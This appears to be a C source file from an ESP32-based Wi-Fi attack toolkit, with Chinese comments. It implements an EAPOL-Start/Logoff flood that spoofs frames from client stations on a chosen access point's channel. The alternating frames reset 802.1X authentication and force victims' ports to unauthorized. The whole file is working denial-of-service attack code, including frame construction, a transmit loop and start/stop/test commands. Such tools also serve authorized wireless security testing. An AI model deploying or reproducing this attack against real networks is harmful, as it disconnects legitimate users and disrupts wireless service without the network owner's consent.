// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// EAPOL-Start / Logoff 洪泛：冒充受害 STA 反复踢 AP 的 802.1X 状态机。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"

#define OWNER "eapol"
#define EAPOL_START 1
#define EAPOL_LOGOFF 2
#define ETHERTYPE_EAPOL 0x888E

static bool s_active;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static uint8_t s_tid;
static bool s_qos = true;
static uint8_t s_next_type = EAPOL_START;
static uint32_t s_cursor;
static uint32_t s_frames;
static uint32_t s_starts;
static uint32_t s_logoffs;

static int build_eapol(uint8_t *buf, size_t cap, const uint8_t sta[6]) {
    // EAPOL 体：版本 2、包类型、长度 0，没有载荷
    const uint8_t eapol[4] = {0x02, s_next_type, 0x00, 0x00};
    uint8_t payload[64];
    const int payload_len =
        wf_build_llc_snap(payload, sizeof(payload), ETHERTYPE_EAPOL, eapol, sizeof(eapol));
    if (payload_len <= 0) {
        return -1;
    }
    // ToDS 时驱动把 bssid 写进 Addr1、把 sa 写进 Addr2，正好是 STA→AP 的方向
    return wf_build_data(buf, cap, s_bssid, sta, s_bssid, true, false, s_qos, s_tid, payload,
                         (size_t)payload_len);
}

static void eapol_tick(uint32_t now_ms) {
    (void)now_ms;
    if (!s_active) {
        return;
    }
    static uint8_t stas[HAL_WIFI_STA_MAX][6];
    static uint8_t frame[96];

    const size_t n = attack_sta_on_channel(s_channel, stas, HAL_WIFI_STA_MAX);
    if (n == 0) {
        return;
    }
    const uint8_t *sta = stas[s_cursor % n];
    s_cursor++;
    // Start 和 Logoff 交替：一个让 AP 重开认证，一个让端口掉到未授权
    s_next_type = (s_next_type == EAPOL_START) ? EAPOL_LOGOFF : EAPOL_START;

    const int len = build_eapol(frame, sizeof(frame), sta);
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (s_next_type == EAPOL_START) {
            s_starts++;
        } else {
            s_logoffs++;
        }
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "tid", .type = WB_T_U32, .required = false, .min = 0, .max = 15, .def = 0},
    {.name = "qos", .type = WB_T_BOOL, .required = false, .def = 1},
};

static esp_err_t eapol_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_tid = (uint8_t)wb_args_u32(args, "tid");
    s_qos = wb_args_bool(args, "qos");
    s_next_type = EAPOL_START;
    s_cursor = 0;
    s_frames = 0;
    s_starts = 0;
    s_logoffs = 0;

    hal_wifi_sniffer_enable(true);
    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    s_active = true;
    attack_emit("eapol", true, "ch=%u", (unsigned)s_channel);
    wb_reply_line(reply, "eapol 开跑 ch=%u 帧型=%s tid=%u", (unsigned)s_channel,
                  s_qos ? "qos-data" : "data", (unsigned)s_tid);
    return ESP_OK;
}

static void eapol_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("eapol", false, NULL);
}

static esp_err_t eapol_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    eapol_stop();
    attack_report_rate(reply, "eapol", frames);
    wb_reply_line(reply, "start=%u logoff=%u", (unsigned)s_starts, (unsigned)s_logoffs);
    return ESP_OK;
}

static esp_err_t eapol_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t frame[96];
    const size_t hdr = s_qos ? WF_QOS_HDR_LEN : WF_DATA_HDR_LEN;

    s_next_type = EAPOL_START;
    int len = build_eapol(frame, sizeof(frame), kSta);
    if (len <= 0) {
        wb_reply_fail(reply, "组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "start len=%d fc=0x%02X%02X ethertype=0x%02X%02X type=%u", len, frame[1],
                  frame[0], frame[hdr + 6], frame[hdr + 7], frame[hdr + 9]);

    s_next_type = EAPOL_LOGOFF;
    len = build_eapol(frame, sizeof(frame), kSta);
    if (len <= 0) {
        wb_reply_fail(reply, "logoff 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "logoff len=%d type=%u", len, frame[hdr + 9]);
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", eapol_start, "idx=1..64 [tid=0..15] [qos=bool]", kStartPolicy, 3},
    {"stop", eapol_stop_cmd, "", NULL, 0},
    {"test", eapol_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "eapol",
    .title = "EAPOL",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t eapol_frames(void) {
    return s_frames;
}

static bool eapol_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "eapol",
    .object = &kObject,
    .stop = eapol_stop,
    .tick = eapol_tick,
    .frames = eapol_frames,
    .active = eapol_active,
};

const attack_driver_t *eapol_attack(void) {
    return &kDriver;
}
